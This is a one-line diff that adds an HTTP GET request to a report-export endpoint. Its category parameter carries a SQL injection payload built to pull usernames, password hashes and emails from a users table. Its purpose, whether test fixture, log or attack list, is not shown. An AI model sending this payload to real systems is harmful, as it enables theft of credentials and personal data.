@@ -1,0 +1,1 @@
+GET /api/reports/export?category=' UNION SELECT username, password_hash, email FROM users --
